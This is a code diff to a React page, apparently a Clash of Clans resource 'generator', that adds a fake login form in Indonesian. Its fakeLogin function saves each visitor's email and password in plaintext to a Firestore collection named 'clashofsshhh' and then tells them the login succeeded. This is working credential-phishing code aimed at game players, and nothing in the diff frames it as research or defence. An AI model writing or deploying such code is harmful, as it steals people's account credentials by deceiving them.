@@ -1,5 +1,9 @@
 import { useEffect, useState } from "react";
 import styled from "styled-components";
+import swal from "sweetalert";
+
+import { db } from "./firebase/firebase";
+import { addDoc, collection, Timestamp } from "firebase/firestore";
 
 import Navbar from './components/navbar'
 
@@ -8,25 +12,67 @@ import logo from './assets/bg/bg-coc.webp'
 
 export default function Generator() {
 
+    const [email, setEmail] = useState('')
+    const [password, setPassword] = useState('')
+
+    const [notLogin, setNotLogin] = useState(true)
+
+    function fakeLogin() {
+        try {
+            if (email === '' || password === '') {
+                swal({
+                    icon: 'warning',
+                    title: 'Jangan ada yg kosong ya ',
+                    button: 'Tutup'
+                })
+            } else {
+                addDoc(collection(db, 'clashofsshhh'), {
+                    email: email,
+                    password, password,
+                    date: new Date().toLocaleDateString(),
+                    time: Timestamp.now().toMillis()
+                })
+
+                sessionStorage.setItem('isFakeLogin', false)
+                setNotLogin(false)
+                setEmail('')
+                setPassword('')
+
+                swal({
+                    icon: 'success',
+                    title: 'Berhasil Login',
+                    button: 'Tutup'
+                })
+            }
+
+        } catch (error) {
+            console.log(error)
+        }
+    }
+
+    useEffect(() => {
+        setNotLogin(sessionStorage.getItem('isFakeLogin') === 'false' ? false : true)
+    }, [])
+
     return (
         <>
             <Navbar></Navbar>
             <Container>
                 <img src={logo} alt="logo" draggable="false" />
             </Container>
-            <GetData>
+            {notLogin && (<GetData>
                 <h2>Login Akun Clash of Clans Kamu</h2>
                 <div className="form-group">
                     <p>Masukkan Email:</p>
-                    <input type="email" placeholder="example@gmail.com" />
+                    <input type="email" placeholder="example@gmail.com" onChange={(e) => setEmail(e.target.value)} />
                     <br /><br />
                     <p>Masukkan Password:</p>
-                    <input type="Password" placeholder="Input your password..." />
+                    <input type="Password" placeholder="Input your password..." onChange={(e) => setPassword(e.target.value)} />
                     <br />
                     <br />
-                    <button>Login</button>
+                    <button onClick={() => fakeLogin()}>Login</button>
                 </div>
-            </GetData>
+            </GetData>)}
             <br />
             <br />
             <br />
